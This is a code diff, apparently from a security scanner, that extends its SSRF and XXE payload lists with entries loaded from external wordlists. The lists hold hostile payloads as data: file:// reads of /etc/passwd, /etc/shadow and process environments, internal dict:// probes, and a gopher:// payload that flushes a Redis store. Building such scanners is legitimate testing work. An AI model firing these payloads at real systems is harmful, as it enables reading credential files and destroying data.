@@ -112,8 +112,8 @@ METADATA_MARKERS = [
 _INTERNAL_IPS = ["127.0.0.1", "localhost", "0.0.0.0"]
 _SCAN_PORTS = [21, 22, 80, 443, 2375, 3306, 5432, 5672, 6379, 8080, 8443, 8888, 9200, 27017]
 
-# URL scheme abuse payloads
-_SCHEME_PAYLOADS = [
+# URL scheme abuse payloads — core + ssrf.txt wordlist
+_SCHEME_PAYLOADS_CORE = [
     "file:///etc/passwd",
     "file:///etc/shadow",
     "file:///proc/self/environ",
@@ -123,6 +123,17 @@ _SCHEME_PAYLOADS = [
     "dict://127.0.0.1:11211/stats",
     "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
 ]
+
+def _load_ssrf_payloads() -> list:
+    seen = set(_SCHEME_PAYLOADS_CORE)
+    ext = []
+    for line in load_external_payloads("ssrf"):
+        if line and line not in seen:
+            seen.add(line)
+            ext.append(line)
+    return _SCHEME_PAYLOADS_CORE + ext
+
+_SCHEME_PAYLOADS = _load_ssrf_payloads()
 
 # XXE template — {U} will be replaced with the target URI
 XXE_POC = """<?xml version="1.0" encoding="UTF-8"?>
@@ -136,13 +147,28 @@ XXE_SVG = """<?xml version="1.0" encoding="UTF-8"?>
   <text>&xxe;</text>
 </svg>"""
 
-# XXE file targets
-_XXE_TARGETS = [
+# XXE file targets — core + xxe.txt wordlist (file:// URI'leri çıkar)
+_XXE_TARGETS_CORE = [
     "file:///etc/passwd",
     "file:///etc/hostname",
     "file:///proc/self/environ",
     "file:///windows/win.ini",
 ]
+
+def _load_xxe_targets() -> list:
+    seen = set(_XXE_TARGETS_CORE)
+    ext = []
+    for line in load_external_payloads("xxe"):
+        # xxe.txt'den file:// ve http:// URI'lerini çıkar
+        import re as _re
+        for m in _re.finditer(r'(?:SYSTEM\s+"([^"]+)"|href="([^"]+)")', line):
+            uri = m.group(1) or m.group(2)
+            if uri and uri not in seen:
+                seen.add(uri)
+                ext.append(uri)
+    return _XXE_TARGETS_CORE + ext
+
+_XXE_TARGETS = _load_xxe_targets()
 
 # XXE success markers (content that should NOT appear in normal responses)
 _XXE_MARKERS = [
